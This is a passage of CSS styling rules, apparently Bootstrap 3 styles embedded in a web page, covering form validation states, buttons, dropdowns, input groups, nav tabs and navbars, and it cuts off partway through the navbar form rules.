        .has-warning .help-block,
        .has-warning .control-label,
        .has-warning .radio,
        .has-warning .checkbox,
        .has-warning .radio-inline,
        .has-warning .checkbox-inline,
        .has-warning.radio label,
        .has-warning.checkbox label,
        .has-warning.radio-inline label,
        .has-warning.checkbox-inline label {
            color: #8a6d3b;
        }

        .has-warning .form-control {
            border-color: #8a6d3b;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        }

        .has-warning .form-control:focus {
            border-color: #66512c;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #c0a16b;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #c0a16b;
        }

        .has-warning .input-group-addon {
            color: #8a6d3b;
            background-color: #fcf8e3;
            border-color: #8a6d3b;
        }

        .has-warning .form-control-feedback {
            color: #8a6d3b;
        }

        .has-error .help-block,
        .has-error .control-label,
        .has-error .radio,
        .has-error .checkbox,
        .has-error .radio-inline,
        .has-error .checkbox-inline,
        .has-error.radio label,
        .has-error.checkbox label,
        .has-error.radio-inline label,
        .has-error.checkbox-inline label {
            color: #a94442;
        }

        .has-error .form-control {
            border-color: #a94442;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        }

        .has-error .form-control:focus {
            border-color: #843534;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ce8483;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ce8483;
        }

        .has-error .input-group-addon {
            color: #a94442;
            background-color: #f2dede;
            border-color: #a94442;
        }

        .has-error .form-control-feedback {
            color: #a94442;
        }

        .has-feedback label~.form-control-feedback {
            top: 25px;
        }

        .has-feedback label.sr-only~.form-control-feedback {
            top: 0;
        }

        .help-block {
            display: block;
            margin-top: 5px;
            margin-bottom: 10px;
            color: #737373;
        }

        @media (min-width: 768px) {
            .form-inline .form-group {
                display: inline-block;
                margin-bottom: 0;
                vertical-align: middle;
            }

            .form-inline .form-control {
                display: inline-block;
                width: auto;
                vertical-align: middle;
            }

            .form-inline .form-control-static {
                display: inline-block;
            }

            .form-inline .input-group {
                display: inline-table;
                vertical-align: middle;
            }

            .form-inline .input-group .input-group-addon,
            .form-inline .input-group .input-group-btn,
            .form-inline .input-group .form-control {
                width: auto;
            }

            .form-inline .input-group>.form-control {
                width: 100%;
            }

            .form-inline .control-label {
                margin-bottom: 0;
                vertical-align: middle;
            }

            .form-inline .radio,
            .form-inline .checkbox {
                display: inline-block;
                margin-top: 0;
                margin-bottom: 0;
                vertical-align: middle;
            }

            .form-inline .radio label,
            .form-inline .checkbox label {
                padding-left: 0;
            }

            .form-inline .radio input[type="radio"],
            .form-inline .checkbox input[type="checkbox"] {
                position: relative;
                margin-left: 0;
            }

            .form-inline .has-feedback .form-control-feedback {
                top: 0;
            }
        }

        .form-horizontal .radio,
        .form-horizontal .checkbox,
        .form-horizontal .radio-inline,
        .form-horizontal .checkbox-inline {
            padding-top: 5px;
            margin-top: 0;
            margin-bottom: 0;
        }

        .form-horizontal .radio,
        .form-horizontal .checkbox {
            min-height: 25px;
        }

        .form-horizontal .form-group {
            margin-right: -15px;
            margin-left: -15px;
        }

        @media (min-width: 768px) {
            .form-horizontal .control-label {
                padding-top: 5px;
                margin-bottom: 0;
                text-align: right;
            }
        }

        .form-horizontal .has-feedback .form-control-feedback {
            right: 15px;
        }

        @media (min-width: 768px) {
            .form-horizontal .form-group-lg .control-label {
                padding-top: 11px;
                font-size: 18px;
            }
        }

        @media (min-width: 768px) {
            .form-horizontal .form-group-sm .control-label {
                padding-top: 6px;
                font-size: 12px;
            }
        }

        .btn {
            display: inline-block;
            margin-bottom: 0;
            font-weight: normal;
            text-align: center;
            white-space: nowrap;
            vertical-align: middle;
            touch-action: manipulation;
            cursor: pointer;
            background-image: none;
            border: 1px solid transparent;
            padding: 4px 12px;
            font-size: 14px;
            line-height: 1.42857143;
            border-radius: 3px;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .btn:focus,
        .btn:active:focus,
        .btn.active:focus,
        .btn.focus,
        .btn:active.focus,
        .btn.active.focus {
            outline: 5px auto -webkit-focus-ring-color;
            outline-offset: -2px;
        }

        .btn:hover,
        .btn:focus,
        .btn.focus {
            color: #333;
            text-decoration: none;
        }

        .btn:active,
        .btn.active {
            background-image: none;
            outline: 0;
            -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
            box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
        }

        .btn.disabled,
        .btn[disabled],
        fieldset[disabled] .btn {
            cursor: not-allowed;
            filter: alpha(opacity=65);
            opacity: 0.65;
            -webkit-box-shadow: none;
            box-shadow: none;
        }

        a.btn.disabled,
        fieldset[disabled] a.btn {
            pointer-events: none;
        }

        .btn-default {
            color: #333;
            background-color: #fff;
            border-color: #ccc;
        }

        .btn-default:focus,
        .btn-default.focus {
            color: #333;
            background-color: #e6e6e6;
            border-color: #8c8c8c;
        }

        .btn-default:hover {
            color: #333;
            background-color: #e6e6e6;
            border-color: #adadad;
        }

        .btn-default:active,
        .btn-default.active,
        .open>.dropdown-toggle.btn-default {
            color: #333;
            background-color: #e6e6e6;
            background-image: none;
            border-color: #adadad;
        }

        .btn-default .badge {
            color: #fff;
            background-color: #333;
        }

        .btn-primary {
            color: #fff;
            background-color: #07b;
            border-color: #0067a2;
        }

        .btn-primary:focus,
        .btn-primary.focus {
            color: #fff;
            background-color: #005788;
            border-color: #001622;
        }

        .btn-primary:hover {
            color: #fff;
            background-color: #005788;
            border-color: #004064;
        }

        .btn-primary:active,
        .btn-primary.active,
        .open>.dropdown-toggle.btn-primary {
            color: #fff;
            background-color: #005788;
            background-image: none;
            border-color: #004064;
        }

        .btn-primary .badge {
            color: #07b;
            background-color: #fff;
        }

        .btn-success {
            color: #fff;
            background-color: #198819;
            border-color: #157215;
        }

        .btn-success:focus,
        .btn-success.focus {
            color: #fff;
            background-color: #115d11;
            border-color: #010701;
        }

        .btn-success:hover {
            color: #fff;
            background-color: #115d11;
            border-color: #0c3f0c;
        }

        .btn-success:active,
        .btn-success.active,
        .open>.dropdown-toggle.btn-success {
            color: #fff;
            background-color: #115d11;
            background-image: none;
            border-color: #0c3f0c;
        }

        .btn-success .badge {
            color: #198819;
            background-color: #fff;
        }

        .btn-info {
            color: #fff;
            background-color: #5bc0de;
            border-color: #46b8da;
        }

        .btn-info:focus,
        .btn-info.focus {
            color: #fff;
            background-color: #31b0d5;
            border-color: #1b6d85;
        }

        .btn-info:hover {
            color: #fff;
            background-color: #31b0d5;
            border-color: #269abc;
        }

        .btn-info:active,
        .btn-info.active,
        .open>.dropdown-toggle.btn-info {
            color: #fff;
            background-color: #31b0d5;
            background-image: none;
            border-color: #269abc;
        }

        .btn-info .badge {
            color: #5bc0de;
            background-color: #fff;
        }

        .btn-warning {
            color: #764500;
            background-color: #fbb450;
            border-color: #faa937;
        }

        .btn-warning:focus,
        .btn-warning.focus {
            color: #764500;
            background-color: #fa9f1e;
            border-color: #ae6704;
        }

        .btn-warning:hover {
            color: #764500;
            background-color: #fa9f1e;
            border-color: #ef8e05;
        }

        .btn-warning:active,
        .btn-warning.active,
        .open>.dropdown-toggle.btn-warning {
            color: #764500;
            background-color: #fa9f1e;
            background-image: none;
            border-color: #ef8e05;
        }

        .btn-warning .badge {
            color: #fbb450;
            background-color: #764500;
        }

        .btn-danger {
            color: #fff;
            background-color: #df332e;
            border-color: #d32520;
        }

        .btn-danger:focus,
        .btn-danger.focus {
            color: #fff;
            background-color: #bd211d;
            border-color: #65120f;
        }

        .btn-danger:hover {
            color: #fff;
            background-color: #bd211d;
            border-color: #9e1c18;
        }

        .btn-danger:active,
        .btn-danger.active,
        .open>.dropdown-toggle.btn-danger {
            color: #fff;
            background-color: #bd211d;
            background-image: none;
            border-color: #9e1c18;
        }

        .btn-danger .badge {
            color: #df332e;
            background-color: #fff;
        }

        .btn-link {
            font-weight: 400;
            color: #07b;
            border-radius: 0;
        }

        .btn-link,
        .btn-link:active,
        .btn-link.active,
        .btn-link[disabled],
        fieldset[disabled] .btn-link {
            background-color: transparent;
            -webkit-box-shadow: none;
            box-shadow: none;
        }

        .btn-link,
        .btn-link:hover,
        .btn-link:focus,
        .btn-link:active {
            border-color: transparent;
        }

        .btn-link:hover,
        .btn-link:focus {
            color: #00466e;
            text-decoration: underline;
            background-color: transparent;
        }

        .btn-link[disabled]:hover,
        fieldset[disabled] .btn-link:hover,
        .btn-link[disabled]:focus,
        fieldset[disabled] .btn-link:focus {
            color: #777;
            text-decoration: none;
        }

        .btn-lg,
        .btn-group-lg>.btn {
            padding: 10px 16px;
            font-size: 18px;
            line-height: 1.3333333;
            border-radius: 3px;
        }

        .btn-sm,
        .btn-group-sm>.btn {
            padding: 5px 10px;
            font-size: 12px;
            line-height: 1.5;
            border-radius: 3px;
        }

        .btn-xs,
        .btn-group-xs>.btn {
            padding: 1px 5px;
            font-size: 12px;
            line-height: 1.5;
            border-radius: 3px;
        }

        .btn-block {
            display: block;
            width: 100%;
        }

        .btn-block+.btn-block {
            margin-top: 5px;
        }

        input[type="submit"].btn-block,
        input[type="reset"].btn-block,
        input[type="button"].btn-block {
            width: 100%;
        }

        .fade {
            opacity: 0;
            -webkit-transition: opacity 0.15s linear;
            -o-transition: opacity 0.15s linear;
            transition: opacity 0.15s linear;
        }

        .fade.in {
            opacity: 1;
        }

        .collapse {
            display: none;
        }

        .collapse.in {
            display: block;
        }

        tr.collapse.in {
            display: table-row;
        }

        tbody.collapse.in {
            display: table-row-group;
        }

        .collapsing {
            position: relative;
            height: 0;
            overflow: hidden;
            -webkit-transition-property: height, visibility;
            transition-property: height, visibility;
            -webkit-transition-duration: 0.35s;
            transition-duration: 0.35s;
            -webkit-transition-timing-function: ease;
            transition-timing-function: ease;
        }

        .caret {
            display: inline-block;
            width: 0;
            height: 0;
            margin-left: 2px;
            vertical-align: middle;
            border-top: 4px dashed;
            border-top: 4px solid \9;
            border-right: 4px solid transparent;
            border-left: 4px solid transparent;
        }

        .dropup,
        .dropdown {
            position: relative;
        }

        .dropdown-toggle:focus {
            outline: 0;
        }

        .dropdown-menu {
            position: absolute;
            top: 100%;
            left: 0;
            z-index: 1000;
            display: none;
            float: left;
            min-width: 160px;
            padding: 5px 0;
            margin: 2px 0 0;
            font-size: 14px;
            text-align: left;
            list-style: none;
            background-color: #fff;
            background-clip: padding-box;
            border: 1px solid #ccc;
            border: 1px solid rgba(0, 0, 0, 0.15);
            border-radius: 3px;
            -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.175);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.175);
        }

        .dropdown-menu.pull-right {
            right: 0;
            left: auto;
        }

        .dropdown-menu .divider {
            height: 1px;
            margin: 9px 0;
            overflow: hidden;
            background-color: #e5e5e5;
        }

        .dropdown-menu>li>a {
            display: block;
            padding: 3px 20px;
            clear: both;
            font-weight: 400;
            line-height: 1.42857143;
            color: #333;
            white-space: nowrap;
        }

        .dropdown-menu>li>a:hover,
        .dropdown-menu>li>a:focus {
            color: #262626;
            text-decoration: none;
            background-color: #f5f5f5;
        }

        .dropdown-menu>.active>a,
        .dropdown-menu>.active>a:hover,
        .dropdown-menu>.active>a:focus {
            color: #fff;
            text-decoration: none;
            background-color: #f80;
            outline: 0;
        }

        .dropdown-menu>.disabled>a,
        .dropdown-menu>.disabled>a:hover,
        .dropdown-menu>.disabled>a:focus {
            color: #777;
        }

        .dropdown-menu>.disabled>a:hover,
        .dropdown-menu>.disabled>a:focus {
            text-decoration: none;
            cursor: not-allowed;
            background-color: transparent;
            background-image: none;
            filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
        }

        .open>.dropdown-menu {
            display: block;
        }

        .open>a {
            outline: 0;
        }

        .dropdown-menu-right {
            right: 0;
            left: auto;
        }

        .dropdown-menu-left {
            right: auto;
            left: 0;
        }

        .dropdown-header {
            display: block;
            padding: 3px 20px;
            font-size: 12px;
            line-height: 1.42857143;
            color: #777;
            white-space: nowrap;
        }

        .dropdown-backdrop {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 990;
        }

        .pull-right>.dropdown-menu {
            right: 0;
            left: auto;
        }

        .dropup .caret,
        .navbar-fixed-bottom .dropdown .caret {
            content: "";
            border-top: 0;
            border-bottom: 4px dashed;
            border-bottom: 4px solid \9;
        }

        .dropup .dropdown-menu,
        .navbar-fixed-bottom .dropdown .dropdown-menu {
            top: auto;
            bottom: 100%;
            margin-bottom: 2px;
        }

        @media (min-width: 768px) {
            .navbar-right .dropdown-menu {
                right: 0;
                left: auto;
            }

            .navbar-right .dropdown-menu-left {
                right: auto;
                left: 0;
            }
        }

        .btn-group,
        .btn-group-vertical {
            position: relative;
            display: inline-block;
            vertical-align: middle;
        }

        .btn-group>.btn,
        .btn-group-vertical>.btn {
            position: relative;
            float: left;
        }

        .btn-group>.btn:hover,
        .btn-group-vertical>.btn:hover,
        .btn-group>.btn:focus,
        .btn-group-vertical>.btn:focus,
        .btn-group>.btn:active,
        .btn-group-vertical>.btn:active,
        .btn-group>.btn.active,
        .btn-group-vertical>.btn.active {
            z-index: 2;
        }

        .btn-group .btn+.btn,
        .btn-group .btn+.btn-group,
        .btn-group .btn-group+.btn,
        .btn-group .btn-group+.btn-group {
            margin-left: -1px;
        }

        .btn-toolbar {
            margin-left: -5px;
        }

        .btn-toolbar .btn,
        .btn-toolbar .btn-group,
        .btn-toolbar .input-group {
            float: left;
        }

        .btn-toolbar>.btn,
        .btn-toolbar>.btn-group,
        .btn-toolbar>.input-group {
            margin-left: 5px;
        }

        .btn-group>.btn:not(:first-child):not(:last-child):not(.dropdown-toggle) {
            border-radius: 0;
        }

        .btn-group>.btn:first-child {
            margin-left: 0;
        }

        .btn-group>.btn:first-child:not(:last-child):not(.dropdown-toggle) {
            border-top-right-radius: 0;
            border-bottom-right-radius: 0;
        }

        .btn-group>.btn:last-child:not(:first-child),
        .btn-group>.dropdown-toggle:not(:first-child) {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0;
        }

        .btn-group>.btn-group {
            float: left;
        }

        .btn-group>.btn-group:not(:first-child):not(:last-child)>.btn {
            border-radius: 0;
        }

        .btn-group>.btn-group:first-child:not(:last-child)>.btn:last-child,
        .btn-group>.btn-group:first-child:not(:last-child)>.dropdown-toggle {
            border-top-right-radius: 0;
            border-bottom-right-radius: 0;
        }

        .btn-group>.btn-group:last-child:not(:first-child)>.btn:first-child {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0;
        }

        .btn-group .dropdown-toggle:active,
        .btn-group.open .dropdown-toggle {
            outline: 0;
        }

        .btn-group>.btn+.dropdown-toggle {
            padding-right: 8px;
            padding-left: 8px;
        }

        .btn-group>.btn-lg+.dropdown-toggle {
            padding-right: 12px;
            padding-left: 12px;
        }

        .btn-group.open .dropdown-toggle {
            -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
            box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
        }

        .btn-group.open .dropdown-toggle.btn-link {
            -webkit-box-shadow: none;
            box-shadow: none;
        }

        .btn .caret {
            margin-left: 0;
        }

        .btn-lg .caret {
            border-width: 5px 5px 0;
            border-bottom-width: 0;
        }

        .dropup .btn-lg .caret {
            border-width: 0 5px 5px;
        }

        .btn-group-vertical>.btn,
        .btn-group-vertical>.btn-group,
        .btn-group-vertical>.btn-group>.btn {
            display: block;
            float: none;
            width: 100%;
            max-width: 100%;
        }

        .btn-group-vertical>.btn-group>.btn {
            float: none;
        }

        .btn-group-vertical>.btn+.btn,
        .btn-group-vertical>.btn+.btn-group,
        .btn-group-vertical>.btn-group+.btn,
        .btn-group-vertical>.btn-group+.btn-group {
            margin-top: -1px;
            margin-left: 0;
        }

        .btn-group-vertical>.btn:not(:first-child):not(:last-child) {
            border-radius: 0;
        }

        .btn-group-vertical>.btn:first-child:not(:last-child) {
            border-top-left-radius: 3px;
            border-top-right-radius: 3px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
        }

        .btn-group-vertical>.btn:last-child:not(:first-child) {
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-bottom-right-radius: 3px;
            border-bottom-left-radius: 3px;
        }

        .btn-group-vertical>.btn-group:not(:first-child):not(:last-child)>.btn {
            border-radius: 0;
        }

        .btn-group-vertical>.btn-group:first-child:not(:last-child)>.btn:last-child,
        .btn-group-vertical>.btn-group:first-child:not(:last-child)>.dropdown-toggle {
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
        }

        .btn-group-vertical>.btn-group:last-child:not(:first-child)>.btn:first-child {
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }

        .btn-group-justified {
            display: table;
            width: 100%;
            table-layout: fixed;
            border-collapse: separate;
        }

        .btn-group-justified>.btn,
        .btn-group-justified>.btn-group {
            display: table-cell;
            float: none;
            width: 1%;
        }

        .btn-group-justified>.btn-group .btn {
            width: 100%;
        }

        .btn-group-justified>.btn-group .dropdown-menu {
            left: auto;
        }

        [data-toggle="buttons"]>.btn input[type="radio"],
        [data-toggle="buttons"]>.btn-group>.btn input[type="radio"],
        [data-toggle="buttons"]>.btn input[type="checkbox"],
        [data-toggle="buttons"]>.btn-group>.btn input[type="checkbox"] {
            position: absolute;
            clip: rect(0, 0, 0, 0);
            pointer-events: none;
        }

        .input-group {
            position: relative;
            display: table;
            border-collapse: separate;
        }

        .input-group[class*="col-"] {
            float: none;
            padding-right: 0;
            padding-left: 0;
        }

        .input-group .form-control {
            position: relative;
            z-index: 2;
            float: left;
            width: 100%;
            margin-bottom: 0;
        }

        .input-group .form-control:focus {
            z-index: 3;
        }

        .input-group-lg>.form-control,
        .input-group-lg>.input-group-addon,
        .input-group-lg>.input-group-btn>.btn {
            height: 46px;
            padding: 10px 16px;
            font-size: 18px;
            line-height: 1.3333333;
            border-radius: 3px;
        }

        select.input-group-lg>.form-control,
        select.input-group-lg>.input-group-addon,
        select.input-group-lg>.input-group-btn>.btn {
            height: 46px;
            line-height: 46px;
        }

        textarea.input-group-lg>.form-control,
        textarea.input-group-lg>.input-group-addon,
        textarea.input-group-lg>.input-group-btn>.btn,
        select[multiple].input-group-lg>.form-control,
        select[multiple].input-group-lg>.input-group-addon,
        select[multiple].input-group-lg>.input-group-btn>.btn {
            height: auto;
        }

        .input-group-sm>.form-control,
        .input-group-sm>.input-group-addon,
        .input-group-sm>.input-group-btn>.btn {
            height: 30px;
            padding: 5px 10px;
            font-size: 12px;
            line-height: 1.5;
            border-radius: 3px;
        }

        select.input-group-sm>.form-control,
        select.input-group-sm>.input-group-addon,
        select.input-group-sm>.input-group-btn>.btn {
            height: 30px;
            line-height: 30px;
        }

        textarea.input-group-sm>.form-control,
        textarea.input-group-sm>.input-group-addon,
        textarea.input-group-sm>.input-group-btn>.btn,
        select[multiple].input-group-sm>.form-control,
        select[multiple].input-group-sm>.input-group-addon,
        select[multiple].input-group-sm>.input-group-btn>.btn {
            height: auto;
        }

        .input-group-addon,
        .input-group-btn,
        .input-group .form-control {
            display: table-cell;
        }

        .input-group-addon:not(:first-child):not(:last-child),
        .input-group-btn:not(:first-child):not(:last-child),
        .input-group .form-control:not(:first-child):not(:last-child) {
            border-radius: 0;
        }

        .input-group-addon,
        .input-group-btn {
            width: 1%;
            white-space: nowrap;
            vertical-align: middle;
        }

        .input-group-addon {
            padding: 4px 12px;
            font-size: 14px;
            font-weight: 400;
            line-height: 1;
            color: #555;
            text-align: center;
            background-color: #eee;
            border: 1px solid #ccc;
            border-radius: 3px;
        }

        .input-group-addon.input-sm {
            padding: 5px 10px;
            font-size: 12px;
            border-radius: 3px;
        }

        .input-group-addon.input-lg {
            padding: 10px 16px;
            font-size: 18px;
            border-radius: 3px;
        }

        .input-group-addon input[type="radio"],
        .input-group-addon input[type="checkbox"] {
            margin-top: 0;
        }

        .input-group .form-control:first-child,
        .input-group-addon:first-child,
        .input-group-btn:first-child>.btn,
        .input-group-btn:first-child>.btn-group>.btn,
        .input-group-btn:first-child>.dropdown-toggle,
        .input-group-btn:last-child>.btn:not(:last-child):not(.dropdown-toggle),
        .input-group-btn:last-child>.btn-group:not(:last-child)>.btn {
            border-top-right-radius: 0;
            border-bottom-right-radius: 0;
        }

        .input-group-addon:first-child {
            border-right: 0;
        }

        .input-group .form-control:last-child,
        .input-group-addon:last-child,
        .input-group-btn:last-child>.btn,
        .input-group-btn:last-child>.btn-group>.btn,
        .input-group-btn:last-child>.dropdown-toggle,
        .input-group-btn:first-child>.btn:not(:first-child),
        .input-group-btn:first-child>.btn-group:not(:first-child)>.btn {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0;
        }

        .input-group-addon:last-child {
            border-left: 0;
        }

        .input-group-btn {
            position: relative;
            font-size: 0;
            white-space: nowrap;
        }

        .input-group-btn>.btn {
            position: relative;
        }

        .input-group-btn>.btn+.btn {
            margin-left: -1px;
        }

        .input-group-btn>.btn:hover,
        .input-group-btn>.btn:focus,
        .input-group-btn>.btn:active {
            z-index: 2;
        }

        .input-group-btn:first-child>.btn,
        .input-group-btn:first-child>.btn-group {
            margin-right: -1px;
        }

        .input-group-btn:last-child>.btn,
        .input-group-btn:last-child>.btn-group {
            z-index: 2;
            margin-left: -1px;
        }

        .nav {
            padding-left: 0;
            margin-bottom: 0;
            list-style: none;
        }

        .nav>li {
            position: relative;
            display: block;
        }

        .nav>li>a {
            position: relative;
            display: block;
            padding: 10px 15px;
        }

        .nav>li>a:hover,
        .nav>li>a:focus {
            text-decoration: none;
            background-color: #eee;
        }

        .nav>li.disabled>a {
            color: #777;
        }

        .nav>li.disabled>a:hover,
        .nav>li.disabled>a:focus {
            color: #777;
            text-decoration: none;
            cursor: not-allowed;
            background-color: transparent;
        }

        .nav .open>a,
        .nav .open>a:hover,
        .nav .open>a:focus {
            background-color: #eee;
            border-color: #07b;
        }

        .nav .nav-divider {
            height: 1px;
            margin: 9px 0;
            overflow: hidden;
            background-color: #e5e5e5;
        }

        .nav>li>a>img {
            max-width: none;
        }

        .nav-tabs {
            border-bottom: 1px solid #ddd;
        }

        .nav-tabs>li {
            float: left;
            margin-bottom: -1px;
        }

        .nav-tabs>li>a {
            margin-right: 2px;
            line-height: 1.42857143;
            border: 1px solid transparent;
            border-radius: 3px 3px 0 0;
        }

        .nav-tabs>li>a:hover {
            border-color: #eee #eee #ddd;
        }

        .nav-tabs>li.active>a,
        .nav-tabs>li.active>a:hover,
        .nav-tabs>li.active>a:focus {
            color: #555;
            cursor: default;
            background-color: #fff;
            border: 1px solid #ddd;
            border-bottom-color: transparent;
        }

        .nav-tabs.nav-justified {
            width: 100%;
            border-bottom: 0;
        }

        .nav-tabs.nav-justified>li {
            float: none;
        }

        .nav-tabs.nav-justified>li>a {
            margin-bottom: 5px;
            text-align: center;
        }

        .nav-tabs.nav-justified>.dropdown .dropdown-menu {
            top: auto;
            left: auto;
        }

        @media (min-width: 768px) {
            .nav-tabs.nav-justified>li {
                display: table-cell;
                width: 1%;
            }

            .nav-tabs.nav-justified>li>a {
                margin-bottom: 0;
            }
        }

        .nav-tabs.nav-justified>li>a {
            margin-right: 0;
            border-radius: 3px;
        }

        .nav-tabs.nav-justified>.active>a,
        .nav-tabs.nav-justified>.active>a:hover,
        .nav-tabs.nav-justified>.active>a:focus {
            border: 1px solid #ddd;
        }

        @media (min-width: 768px) {
            .nav-tabs.nav-justified>li>a {
                border-bottom: 1px solid #ddd;
                border-radius: 3px 3px 0 0;
            }

            .nav-tabs.nav-justified>.active>a,
            .nav-tabs.nav-justified>.active>a:hover,
            .nav-tabs.nav-justified>.active>a:focus {
                border-bottom-color: #fff;
            }
        }

        .nav-pills>li {
            float: left;
        }

        .nav-pills>li>a {
            border-radius: 3px;
        }

        .nav-pills>li+li {
            margin-left: 2px;
        }

        .nav-pills>li.active>a,
        .nav-pills>li.active>a:hover,
        .nav-pills>li.active>a:focus {
            color: #fff;
            background-color: #f80;
        }

        .nav-stacked>li {
            float: none;
        }

        .nav-stacked>li+li {
            margin-top: 2px;
            margin-left: 0;
        }

        .nav-justified {
            width: 100%;
        }

        .nav-justified>li {
            float: none;
        }

        .nav-justified>li>a {
            margin-bottom: 5px;
            text-align: center;
        }

        .nav-justified>.dropdown .dropdown-menu {
            top: auto;
            left: auto;
        }

        @media (min-width: 768px) {
            .nav-justified>li {
                display: table-cell;
                width: 1%;
            }

            .nav-justified>li>a {
                margin-bottom: 0;
            }
        }

        .nav-tabs-justified {
            border-bottom: 0;
        }

        .nav-tabs-justified>li>a {
            margin-right: 0;
            border-radius: 3px;
        }

        .nav-tabs-justified>.active>a,
        .nav-tabs-justified>.active>a:hover,
        .nav-tabs-justified>.active>a:focus {
            border: 1px solid #ddd;
        }

        @media (min-width: 768px) {
            .nav-tabs-justified>li>a {
                border-bottom: 1px solid #ddd;
                border-radius: 3px 3px 0 0;
            }

            .nav-tabs-justified>.active>a,
            .nav-tabs-justified>.active>a:hover,
            .nav-tabs-justified>.active>a:focus {
                border-bottom-color: #fff;
            }
        }

        .tab-content>.tab-pane {
            display: none;
        }

        .tab-content>.active {
            display: block;
        }

        .nav-tabs .dropdown-menu {
            margin-top: -1px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }

        .navbar {
            position: relative;
            min-height: 50px;
            margin-bottom: 20px;
            border: 1px solid transparent;
        }

        @media (min-width: 768px) {
            .navbar {
                border-radius: 3px;
            }
        }

        @media (min-width: 768px) {
            .navbar-header {
                float: left;
            }
        }

        .navbar-collapse {
            padding-right: 15px;
            padding-left: 15px;
            overflow-x: visible;
            border-top: 1px solid transparent;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.1);
            -webkit-overflow-scrolling: touch;
        }

        .navbar-collapse.in {
            overflow-y: auto;
        }

        @media (min-width: 768px) {
            .navbar-collapse {
                width: auto;
                border-top: 0;
                box-shadow: none;
            }

            .navbar-collapse.collapse {
                display: block !important;
                height: auto !important;
                padding-bottom: 0;
                overflow: visible !important;
            }

            .navbar-collapse.in {
                overflow-y: visible;
            }

            .navbar-fixed-top .navbar-collapse,
            .navbar-static-top .navbar-collapse,
            .navbar-fixed-bottom .navbar-collapse {
                padding-right: 0;
                padding-left: 0;
            }
        }

        .navbar-fixed-top,
        .navbar-fixed-bottom {
            position: fixed;
            right: 0;
            left: 0;
            z-index: 1030;
        }

        .navbar-fixed-top .navbar-collapse,
        .navbar-fixed-bottom .navbar-collapse {
            max-height: 340px;
        }

        @media (max-device-width: 480px) and (orientation: landscape) {

            .navbar-fixed-top .navbar-collapse,
            .navbar-fixed-bottom .navbar-collapse {
                max-height: 200px;
            }
        }

        @media (min-width: 768px) {

            .navbar-fixed-top,
            .navbar-fixed-bottom {
                border-radius: 0;
            }
        }

        .navbar-fixed-top {
            top: 0;
            border-width: 0 0 1px;
        }

        .navbar-fixed-bottom {
            bottom: 0;
            margin-bottom: 0;
            border-width: 1px 0 0;
        }

        .container>.navbar-header,
        .container-fluid>.navbar-header,
        .container>.navbar-collapse,
        .container-fluid>.navbar-collapse {
            margin-right: -15px;
            margin-left: -15px;
        }

        @media (min-width: 768px) {

            .container>.navbar-header,
            .container-fluid>.navbar-header,
            .container>.navbar-collapse,
            .container-fluid>.navbar-collapse {
                margin-right: 0;
                margin-left: 0;
            }
        }

        .navbar-static-top {
            z-index: 1000;
            border-width: 0 0 1px;
        }

        @media (min-width: 768px) {
            .navbar-static-top {
                border-radius: 0;
            }
        }

        .navbar-brand {
            float: left;
            height: 50px;
            padding: 15px 15px;
            font-size: 18px;
            line-height: 20px;
        }

        .navbar-brand:hover,
        .navbar-brand:focus {
            text-decoration: none;
        }

        .navbar-brand>img {
            display: block;
        }

        @media (min-width: 768px) {

            .navbar>.container .navbar-brand,
            .navbar>.container-fluid .navbar-brand {
                margin-left: -15px;
            }
        }

        .navbar-toggle {
            position: relative;
            float: right;
            padding: 9px 10px;
            margin-right: 15px;
            margin-top: 8px;
            margin-bottom: 8px;
            background-color: transparent;
            background-image: none;
            border: 1px solid transparent;
            border-radius: 3px;
        }

        .navbar-toggle:focus {
            outline: 0;
        }

        .navbar-toggle .icon-bar {
            display: block;
            width: 22px;
            height: 2px;
            border-radius: 1px;
        }

        .navbar-toggle .icon-bar+.icon-bar {
            margin-top: 4px;
        }

        @media (min-width: 768px) {
            .navbar-toggle {
                display: none;
            }
        }

        .navbar-nav {
            margin: 7.5px -15px;
        }

        .navbar-nav>li>a {
            padding-top: 10px;
            padding-bottom: 10px;
            line-height: 20px;
        }

        @media (max-width: 767px) {
            .navbar-nav .open .dropdown-menu {
                position: static;
                float: none;
                width: auto;
                margin-top: 0;
                background-color: transparent;
                border: 0;
                box-shadow: none;
            }

            .navbar-nav .open .dropdown-menu>li>a,
            .navbar-nav .open .dropdown-menu .dropdown-header {
                padding: 5px 15px 5px 25px;
            }

            .navbar-nav .open .dropdown-menu>li>a {
                line-height: 20px;
            }

            .navbar-nav .open .dropdown-menu>li>a:hover,
            .navbar-nav .open .dropdown-menu>li>a:focus {
                background-image: none;
            }
        }

        @media (min-width: 768px) {
            .navbar-nav {
                float: left;
                margin: 0;
            }

            .navbar-nav>li {
                float: left;
            }

            .navbar-nav>li>a {
                padding-top: 15px;
                padding-bottom: 15px;
            }
        }

        .navbar-form {
            padding: 10px 15px;
            margin-right: -15px;
            margin-left: -15px;
            border-top: 1px solid transparent;
            border-bottom: 1px solid transparent;
